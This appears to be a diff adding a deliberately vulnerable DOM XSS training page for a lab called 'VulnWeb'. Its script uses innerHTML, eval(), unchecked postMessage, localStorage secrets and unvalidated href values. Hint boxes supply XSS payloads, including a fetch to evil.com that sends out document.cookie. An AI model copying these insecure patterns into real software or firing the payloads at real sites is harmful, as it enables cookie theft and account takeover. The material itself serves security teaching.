@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulnWeb — DOM XSS Lab</title>
+    <link rel="stylesheet" href="/src/css/style.css">
+</head>
+<body>
+    <div class="warning-banner">
+        ⚠️ INTENTIONALLY VULNERABLE APPLICATION — FOR EDUCATIONAL USE ONLY ⚠️
+    </div>
+
+    <nav class="navbar">
+        <a href="/src/index.html" class="brand">Vuln<span>Web</span></a>
+        <div class="nav-links">
+            <a href="/src/index.html">Home</a>
+            <a href="/src/api-tester.html">API Tester</a>
+            <a href="/src/dom-xss.html">DOM XSS</a>
+            <a href="/src/login-client.html">Client Login</a>
+            <a href="/src/chat.html">Chat</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <!-- VULN 1: DOM XSS via innerHTML with URL fragment -->
+        <div class="card">
+            <h2>1. DOM XSS — URL Fragment <span class="vuln-badge vuln-high">HIGH</span></h2>
+            <p>This greeting message reads from the URL hash and injects it unsafely.</p>
+            <div id="greeting-output" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Try: dom-xss.html#&lt;img src=x onerror="alert('DOM XSS via hash')"&gt;
+The page reads location.hash and injects it via innerHTML.</pre>
+                </details>
+            </div>
+        </div>
+
+        <!-- VULN 2: DOM XSS via URL search parameter -->
+        <div class="card">
+            <h2>2. DOM XSS — Query Parameter <span class="vuln-badge vuln-high">HIGH</span></h2>
+            <p>Search results rendered directly from query params into the DOM.</p>
+            <form id="dom-search-form">
+                <input type="text" id="dom-search-input" placeholder="Search something...">
+                <button type="submit">Search</button>
+            </form>
+            <div id="search-results" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Try: dom-xss.html?query=&lt;img src=x onerror="alert('XSS')"&gt;
+The query param is written to the DOM with innerHTML.</pre>
+                </details>
+            </div>
+        </div>
+
+        <!-- VULN 3: DOM XSS via document.write -->
+        <div class="card">
+            <h2>3. DOM XSS — document.write() <span class="vuln-badge vuln-high">HIGH</span></h2>
+            <p>User-selected theme is written into the page using document.write equivalent.</p>
+            <form id="theme-form">
+                <label>Custom Theme Name:</label>
+                <input type="text" id="theme-input" placeholder="dark-red">
+                <button type="submit">Apply Theme</button>
+            </form>
+            <div id="theme-output" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Try: &lt;/div&gt;&lt;script&gt;alert('XSS via theme')&lt;/script&gt;
+Input is placed in innerHTML without sanitization.</pre>
+                </details>
+            </div>
+        </div>
+
+        <!-- VULN 4: DOM XSS via eval -->
+        <div class="card">
+            <h2>4. DOM XSS — eval() Calculator <span class="vuln-badge vuln-high">CRITICAL</span></h2>
+            <p>A "safe" calculator that uses eval() to process expressions.</p>
+            <form id="calc-form">
+                <label>Expression:</label>
+                <input type="text" id="calc-input" placeholder="2 + 2">
+                <button type="submit">Calculate</button>
+            </form>
+            <div id="calc-output" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Try: alert(document.cookie)
+Or:  fetch('http://evil.com/?c='+document.cookie)
+The input is passed directly to eval().</pre>
+                </details>
+            </div>
+        </div>
+
+        <!-- VULN 5: DOM XSS via postMessage -->
+        <div class="card">
+            <h2>5. DOM XSS — postMessage <span class="vuln-badge vuln-high">HIGH</span></h2>
+            <p>This component listens for messages from any origin and renders them.</p>
+            <div id="message-display" class="output-box">Waiting for messages...</div>
+            <button id="send-test-msg" class="btn-secondary">Send Test Message</button>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>The page listens for postMessage without checking origin.
+From browser console:
+  window.postMessage('&lt;img src=x onerror="alert(1)"&gt;', '*')
+
+Or from an attacker page:
+  targetWindow.postMessage('&lt;script&gt;alert(1)&lt;/script&gt;', '*')</pre>
+                </details>
+            </div>
+        </div>
+
+        <!-- VULN 6: Insecure localStorage -->
+        <div class="card">
+            <h2>6. Sensitive Data in localStorage <span class="vuln-badge vuln-med">MEDIUM</span></h2>
+            <p>User session and tokens stored insecurely in localStorage.</p>
+            <button id="btn-store-token" class="btn">Store Auth Token</button>
+            <button id="btn-show-storage" class="btn-secondary">Show Stored Data</button>
+            <div id="storage-output" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Open DevTools → Application → LocalStorage.
+Tokens, passwords, and PII are stored in plaintext.
+Any XSS can steal them with: JSON.stringify(localStorage)
+                    </pre>
+                </details>
+            </div>
+        </div>
+
+        <!-- VULN 7: jQuery-like sink -->
+        <div class="card">
+            <h2>7. DOM Clobbering / unsafe .href <span class="vuln-badge vuln-med">MEDIUM</span></h2>
+            <p>A "safe" link generator that doesn't validate the protocol.</p>
+            <form id="link-form">
+                <label>Generate a link:</label>
+                <input type="text" id="link-input" placeholder="https://example.com">
+                <button type="submit">Create Link</button>
+            </form>
+            <div id="link-output" class="output-box"></div>
+            <div class="hint-box">
+                <details>
+                    <summary>💡 Hint</summary>
+                    <pre>Try: javascript:alert(document.domain)
+The link href is set without protocol validation.
+Clicking it executes arbitrary JavaScript.</pre>
+                </details>
+            </div>
+        </div>
+    </div>
+
+    <footer>VulnWeb v2.0 — DOM XSS Lab — Practice Responsibly</footer>
+
+    <script>
+        // ============================================================
+        // VULNERABILITY: DOM XSS via URL Fragment (location.hash)
+        // ============================================================
+        (function() {
+            var hash = decodeURIComponent(location.hash.substring(1));
+            if (hash) {
+                // VULNERABLE: Injects hash directly into innerHTML
+                document.getElementById('greeting-output').innerHTML =
+                    '<h3>Welcome, ' + hash + '!</h3>';
+            } else {
+                document.getElementById('greeting-output').innerHTML =
+                    '<p style="color:#888;">Add a #name to the URL to see a greeting.</p>';
+            }
+        })();
+
+        // ============================================================
+        // VULNERABILITY: DOM XSS via query parameter
+        // ============================================================
+        (function() {
+            var params = new URLSearchParams(window.location.search);
+            var query = params.get('query');
+            if (query) {
+                // VULNERABLE: Renders query param via innerHTML
+                document.getElementById('search-results').innerHTML =
+                    '<p>Results for: <strong>' + query + '</strong></p>' +
+                    '<p style="color:#888;">No results found.</p>';
+            }
+        })();
+
+        document.getElementById('dom-search-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var q = document.getElementById('dom-search-input').value;
+            // VULNERABLE: Directly injects user input
+            document.getElementById('search-results').innerHTML =
+                '<p>Results for: <strong>' + q + '</strong></p>' +
+                '<p style="color:#888;">No results found.</p>';
+        });
+
+        // ============================================================
+        // VULNERABILITY: DOM XSS via innerHTML (theme)
+        // ============================================================
+        document.getElementById('theme-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var theme = document.getElementById('theme-input').value;
+            // VULNERABLE: User input in innerHTML
+            document.getElementById('theme-output').innerHTML =
+                '<p>Theme applied: <span class="theme-name">' + theme + '</span></p>';
+        });
+
+        // ============================================================
+        // VULNERABILITY: eval() injection via calculator
+        // ============================================================
+        document.getElementById('calc-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var expr = document.getElementById('calc-input').value;
+            try {
+                // VULNERABLE: Direct eval of user input
+                var result = eval(expr);
+                document.getElementById('calc-output').innerHTML =
+                    '<p>Result: <strong>' + result + '</strong></p>';
+            } catch(err) {
+                document.getElementById('calc-output').innerHTML =
+                    '<p style="color:#e94560;">Error: ' + err.message + '</p>';
+            }
+        });
+
+        // ============================================================
+        // VULNERABILITY: postMessage without origin check
+        // ============================================================
+        window.addEventListener('message', function(event) {
+            // VULNERABLE: No origin check — accepts messages from any source
+            // VULNERABLE: Renders message content via innerHTML
+            document.getElementById('message-display').innerHTML =
+                '<p><strong>Message received:</strong> ' + event.data + '</p>';
+        });
+
+        document.getElementById('send-test-msg').addEventListener('click', function() {
+            window.postMessage('<em>Test message from same window</em>', '*');
+        });
+
+        // ============================================================
+        // VULNERABILITY: Sensitive data in localStorage
+        // ============================================================
+        document.getElementById('btn-store-token').addEventListener('click', function() {
+            // VULNERABLE: Storing sensitive tokens in localStorage
+            localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fake_sig');
+            localStorage.setItem('user_password', 'admin123');
+            localStorage.setItem('session_id', 'sess_a1b2c3d4e5f6');
+            localStorage.setItem('credit_card', '4111-1111-1111-1111');
+            localStorage.setItem('api_key', 'sk-live-vuln-key-do-not-share-abc123xyz');
+            document.getElementById('storage-output').innerHTML =
+                '<p class="text-success">Sensitive data stored in localStorage!</p>';
+        });
+
+        document.getElementById('btn-show-storage').addEventListener('click', function() {
+            var data = {};
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                data[key] = localStorage.getItem(key);
+            }
+            document.getElementById('storage-output').innerHTML =
+                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        });
+
+        // ============================================================
+        // VULNERABILITY: javascript: protocol in href
+        // ============================================================
+        document.getElementById('link-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var url = document.getElementById('link-input').value;
+            // VULNERABLE: No protocol validation — allows javascript: URLs
+            document.getElementById('link-output').innerHTML =
+                '<a href="' + url + '" style="color:#45a0e9;font-size:1.2rem;">Click this link: ' + url + '</a>';
+        });
+    </script>
+</body>
+</html>
